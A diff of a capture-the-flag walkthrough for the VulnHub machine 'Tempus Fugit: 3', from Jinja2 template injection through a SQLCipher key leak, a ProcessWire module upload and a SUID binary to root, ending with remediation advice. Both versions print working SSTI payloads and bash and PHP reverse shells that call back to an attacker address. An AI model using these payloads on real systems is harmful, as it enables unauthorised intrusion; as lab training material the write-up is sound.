@@ -1,200 +1,254 @@
 # Tempus Fugit: 3 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.10.X (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | (DHCP — add to `/etc/hosts` as `tempusf3.vh`) |
 | **Difficulty** | Hard |
 | **OS** | Linux |
-| **Flags** | 4 flags across SSTI, SQLite DB, user home, and root |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/tempus-fugit-3,672/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/tempus-fugit-3-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-SSTI (Jinja2) → RCE → `app.py` base64 secret (Flag 1) → sqlcipher DB dump (Flag 2) → SSH port forward → module upload RCE → QR code → SSH (myrtia) → addcustomer UID 1337 → SSH private key (cecil) → SUID `ping` UID check "deadbeef" → root (Flag 4)
+A web application vulnerable to Server-Side Template Injection (SSTI) in Jinja2 provides initial code execution. Reading the application source reveals a `pragma key` used to decrypt a SQLCipher database, yielding user credentials and flags. Port forwarding exposes a second web application (ProcessWire CMS) where a malicious module upload gives a shell. Multiple lateral movement steps through QR-code-based 2FA and SSH key discovery lead to a user capable of running a custom SUID binary that spawns root when the caller's UID matches a hardcoded value.
 
 ## Methodology
 
-1. Network discovery and web enumeration
-2. SSTI identification and RCE via Jinja2
-3. SQLite credential extraction with sqlcipher
-4. Internal port forwarding and second web service
-5. Module upload for foothold
-6. Multi-stage privilege escalation: myrtia → 1337 user → cecil → root
+1. Host discovery and full-port Nmap scan
+2. SSTI identification and exploitation (Jinja2 RCE)
+3. SQLCipher database decryption for credentials and flags
+4. SSH port forwarding to expose internal services
+5. ProcessWire CMS malicious module upload for shell
+6. Lateral movement: QR-code 2FA (`myrtia`), SSH private key (`cecil`)
+7. Privilege escalation: SUID `ping` binary UID check bypass to root
 
----
-
-## Step 1: Network Discovery
+## Step 1: Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.10.0/24
-# Add to /etc/hosts: <IP>  tempusf3.vh
+netdiscover -i eth0
+# Add target to hosts
+echo "192.168.x.x  tempusf3.vh" >> /etc/hosts
+```
+
+## Step 2: Full Port Scan
+
+```bash
 nmap -A -p- tempusf3.vh
 ```
 
----
+Identify web service port(s) and any SSH ports.
 
-## Step 2: SSTI — Jinja2 RCE
+![Nmap full scan](images/01-nmap.png)
 
-The app reflects URL input. Test for SSTI:
+## Step 3: SSTI Identification
+
+The login panel URL accepts user input that is reflected without sanitization. Test for template injection:
+
+- Twig: `{{7*7}}` returns `49` but `{{7*'7'}}` returns `49` (Twig returns `49`)
+- Jinja2: `{{7*'7'}}` returns `7777777`
+
+Confirm Jinja2 with:
 
 ```
-http://tempusf3.vh/path/{{7*7}}
-# Returns 49 → Jinja2 confirmed (not Twig, which returns 49 too, but the __class__ chain differs)
+{{7*'7'}}
+# Output: 7777777
 ```
 
-Confirm RCE:
+Test OS command execution:
 
 ```
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-# uid=33(www-data)
 ```
 
-Reverse shell (attacker on 192.168.10.167:4444):
+![SSTI command execution confirmed](images/02-ssti.png)
 
-```
-{{''.__class__.__mro__[1].__subclasses__()[373]("bash -c 'bash -i >& /dev/tcp/192.168.10.167/4444 0>&1'",shell=True,stdout=-1).communicate()[0].strip()}}
-```
+## Step 4: Reverse Shell via SSTI
+
+Start a netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
----
+Send the reverse shell payload through the SSTI:
 
-## Step 3: Flag 1 — app.py Secret
+```
+{{''.__class__.__mro__[1].__subclasses__()[373](['bash','-c','bash -i >& /dev/tcp/LHOST/4444 0>&1'],stdout=-1,stderr=-1).communicate()}}
+```
 
-From the shell:
+Replace `LHOST` with your attacker IP. A bash shell arrives on the listener.
+
+![Reverse shell received](images/03-shell.png)
+
+## Step 5: Read app.py for Secret Key and Pragma Key
 
 ```bash
 cat app.py
-# Contains a base64-encoded SECRET_KEY and a pragma key for the SQLite DB
-echo "<base64_value>" | base64 -d
-# FLAG 1
+# Reveals: secret_key and pragma key
 ```
 
----
-
-## Step 4: Flag 2 — SQLite DB with sqlcipher
-
-The `pragma key` from `app.py` unlocks the encrypted DB:
+A base64-encoded Flag 1 is also embedded. Decode it:
 
 ```bash
-sqlcipher customers.db
-PRAGMA key = '<pragma_key>';
-.tables
-SELECT * FROM users;
-# Three users + FLAG 2 (base64 encoded values)
+echo "<base64_string>" | base64 -d
 ```
 
-Both user profiles reference port **37303**.
+## Step 6: Decrypt SQLCipher Database
 
----
+A SQLite database is encrypted with SQLCipher. Use the pragma key from `app.py`:
 
-## Step 5: Internal Port Forward
+```bash
+sqlcipher database.db
+PRAGMA key='<pragma_key>';
+.tables
+SELECT * FROM users;
+```
 
-Run an internal port scan:
+This dumps all registered users with their passwords and a base64-encoded Flag 2. Decode Flag 2:
+
+```bash
+echo "<base64_string>" | base64 -d
+# Reveals port number: 37303
+```
+
+## Step 7: Internal Port Scan and Port Forwarding
+
+Run a Python port scanner on the target to find internal ports:
 
 ```python
 import socket
-for port in [22,80,443,37303,8080]:
+for port in range(1, 65535):
     s = socket.socket()
+    s.settimeout(0.1)
     if s.connect_ex(('127.0.0.1', port)) == 0:
-        print(port, 'open')
+        print(port)
     s.close()
 ```
 
-SSH port-forward from attacker:
+Find port 37303 (SSH) and port 443. Forward both:
 
 ```bash
-ssh -L 37303:127.0.0.1:37303 www-data@tempusf3.vh -i id_rsa
-ssh -p 37303 <user>@127.0.0.1
-
-ssh -L 8443:127.0.0.1:443 www-data@tempusf3.vh -i id_rsa
-# Browse https://127.0.0.1:8443 → names "Hugh Janus" as admin
+# From attacker, via SSH port forwarding using an existing session
+ssh -L 37303:127.0.0.1:37303 -L 8443:127.0.0.1:443 user@tempusf3.vh -p <port>
 ```
 
----
+Browsing the forwarded port 443 reveals a second website (ProcessWire CMS) with an admin panel. The site mentions **"Hugh Janus"** as administrator.
 
-## Step 6: Module Upload → Shell
+## Step 8: ProcessWire CMS — Malicious Module Upload
 
-Log in to the second web service as `admin` (Hugh's password from DB).
+Log in to the admin panel at `/processwire/` (or the discovered path):
 
-Download the hello-world module, edit `Helloworld.module.php` to add a reverse shell in the `else` branch:
+- Username: `admin`
+- Password: `Hugh` (the password of "Hugh")
+
+Download the HelloWorld example module from the ProcessWire site. Edit `HelloWorld.module.php` to add a reverse shell in the `else` block:
 
 ```php
-} else {
-    system("bash -c 'bash -i >& /dev/tcp/192.168.10.167/5555 0>&1'");
+else {
+    system('bash -c "bash -i >& /dev/tcp/LHOST/5555 0>&1"');
 }
 ```
 
-Upload the module. Activate it. Catch shell:
+Start a listener:
 
 ```bash
 nc -lvnp 5555
-# shell as www-data on inner service
 ```
 
----
+Upload the modified module through the CMS admin panel (Modules > Install > Upload). Load the module to trigger the payload.
 
-## Step 7: Escalate to myrtia (QR Code + SSH OTP)
+## Step 9: Lateral Movement to User `myrtia`
+
+In the web shell, browse to the backups folder:
 
 ```bash
-ls backups/
-# image named after system user
-# Decode the QR code with zbar or online tool
-# → OTP seed for Google Authenticator (OUPAUTH)
-oathtool --totp -b <seed>
-ssh myrtia@127.0.0.1 -p 37303
-# Enter OTP when prompted
-cat ~/flag3.txt
-# FLAG 3
+find / -name "*.png" 2>/dev/null | grep backup
+```
+
+A backup image named after a user contains a **QR code** encoding a TOTP 2FA secret. Scan it with Google Authenticator or a TOTP app.
+
+```bash
+ssh myrtia@tempusf3.vh -p 37303
+# Enter TOTP code when prompted
+```
+
+Read Flag 4:
+
+```bash
+cat ~/flag4.txt
+```
+
+Check sudo rights:
+
+```bash
 sudo -l
-# can run /opt/addcustomer as root
+# (root) /path/to/addcustomer
 ```
 
----
-
-## Step 8: UID 1337 → Cecil (SSH Key)
+## Step 10: Lateral Movement to User `cecil`
 
 ```bash
-sudo /opt/addcustomer
-# Follow prompts; create user with UID 1337
-# Login as that user
-# Find suspicious file owned by UID 1337 → contains OpenSSH private key
-ssh -i id_1337 cecil@127.0.0.1 -p 37303
+# Find files owned by UID 1337
+find / -uid 1337 2>/dev/null
 ```
 
----
-
-## Step 9: Root via SUID ping
-
-Reverse-engineer `/usr/bin/ping` — it opens a shell when UID matches string "deadbeef":
+Create a new user with UID 1337 to read the file:
 
 ```bash
-# As UID matching "deadbeef" user
-/usr/bin/ping deadbeef
-id
-# uid=0(root)
-cat /root/flag4.txt
-# FLAG 4
+sudo /path/to/addcustomer
+# Create user with UID 1337
+su uid1337user
+cat /path/to/file
+# Contains SSH private key
 ```
 
----
+Try the key against each user:
+
+```bash
+ssh -i id_rsa cecil@tempusf3.vh -p 37303
+```
+
+## Step 11: Privilege Escalation via SUID `ping` Binary
+
+Analyze the custom `ping` binary with Ghidra (or `strings`):
+
+```bash
+strings /path/to/ping
+# Finds hardcoded UID check against "deadbeef"
+```
+
+In Ghidra, the binary spawns `/bin/sh` only when `getuid()` matches `0xdeadbeef` (3735928559 decimal). Create a user with that UID:
+
+```bash
+# As myrtia via sudo addcustomer, create user with UID 3735928559
+su deadbeefuser
+/path/to/ping deadbeef
+whoami
+# root
+```
+
+![Root privilege escalation](images/04-privesc.png)
+
+```bash
+cd /root
+cat flag.txt
+```
+
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Jinja2 SSTI** — never allow user input to be rendered as a template; use `{{ variable }}` with strict context, never eval
-2. **Encrypted SQLite** — pragma keys in source code defeat encryption at rest
-3. **QR code in backup** — embedded secrets in images are security-relevant artifacts
-4. **SUID with UID checks** — custom SUID binaries with hardcoded UID comparisons are logic vulnerabilities
-5. **OTP as sole barrier** — TOTP is effective only if the seed is not recoverable from the filesystem
+- Jinja2 SSTI is critical: unsanitized user input passed to `render_template_string()` allows arbitrary OS command execution.
+- Embedding a `pragma key` in the application source defeats encryption — key material must be stored outside the codebase (environment variables, secrets manager).
+- QR-code 2FA secrets stored as backup images are effectively plaintext credentials.
+- SUID binaries with hardcoded UID checks are a non-standard but real privilege escalation vector; always audit custom SUID binaries with a decompiler.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SSTI in Jinja2 | Use `render_template` with context vars, never eval user input |
-| SQLite pragma key in source | Use environment variables, never hardcode crypto keys |
-| Module upload without validation | Restrict upload types, sign modules, sandbox execution |
-| SUID binary with UID logic | Remove SUID, use proper privilege separation |
-| OTP seed stored in image | Protect backup files, restrict access to backup directories |
+|---|---|
+| Jinja2 SSTI | Never pass user-controlled input to `render_template_string()`; use `render_template()` |
+| SQLCipher key in source code | Store database key in environment variable or secrets manager |
+| ProcessWire module upload as admin | Restrict file upload to trusted admins; disable module uploads in production |
+| 2FA secret stored as backup image | Store TOTP secrets only in the authenticator app; never export as recoverable image |
+| SUID binary UID hardcode | Remove custom SUID binary; use standard sudo with minimal privileges |
